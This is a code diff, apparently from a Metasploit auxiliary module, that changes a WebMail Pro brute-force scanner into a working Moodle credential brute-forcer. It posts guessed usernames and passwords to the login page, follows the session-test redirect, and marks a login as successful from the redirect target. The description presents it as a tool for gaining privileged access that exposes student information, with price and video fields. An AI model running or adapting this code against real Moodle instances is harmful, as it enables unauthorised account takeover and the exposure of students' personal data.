@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class WebMailProRest < ::Metasploit::Framework::LoginScanner::HTTP
+      class Moodle < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,19 +26,31 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'rest.php/token',
-              'vars_get' => {
-                'login' => credential.public,
+              'method' => 'POST',
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'login/index.php',
+              'vars_post' => {
+                'username' => credential.public,
                 'password' => credential.private
               }
             })
 
             res = cli.send_recv(req)
 
-            if res && res.body =~ /,"message":"ok"/
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
-            else
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res.body)
+            if res && res.headers['Location'] =~ /testsession=(\d)/
+              cookie = res.get_cookies
+
+              req = cli.request_cgi({
+                'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'login/index.php?testsession=' + $1,
+                'cookie' => cookie
+              })
+
+              res = cli.send_recv(req)
+
+              if res && (res.headers['Location'] =~ /admin/ || res.headers['Location'] =~ /\/$/)
+                result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+              else
+                result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res.body)
+              end
             end
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
@@ -61,21 +73,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'WebMail Pro PHP REST API Bruteforce',
+        'Name'           => 'Moodle Bruteforce',
         'Description'    => %q(
-        This module attempts to bruteforce weak admin credentials
-        for the WebMail Pro PHP REST API.
+        This module attempts to bruteforce weak credentials on a Moodle instance.
 
-        WebMail Pro is a popular enterprise solution for mail, calendar,
-and file management. Privileged access to a WebMail Pro instance
-could yield significant insight into high value targets in the
-organization or other sensitive information.
+        Moodle is a popular open-source learning management system (LMS)
+that enables trainers, educators, and students to manage and use
+industry-standard educational content. Privileged access to
+Moodle instances may yield signficant insight into sensitive
+information such as student names or other material.
 
-        Categories: Enterprise
+        Categories: Open Source
 
-        Price: 3
+        Price: 2
 
-        Video: https://asciinema.org/a/A8FegLrdYJj67pvwqeevMnkt9
+        Video: none
 
         OS: Multi
 
@@ -92,9 +104,7 @@ organization or other sensitive information.
           ],
         'DefaultOptions' => {
             'RPORT'           => 80,
-            'STOP_ON_SUCCESS' => true,
-            'PASSWORD' => 12345,
-            'USERNAME' => 'mailadm'
+            'STOP_ON_SUCCESS' => true
         }
     )
   end
@@ -110,7 +120,7 @@ organization or other sensitive information.
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::WebMailProRest.new(
+    scanner = Metasploit::Framework::LoginScanner::Moodle.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
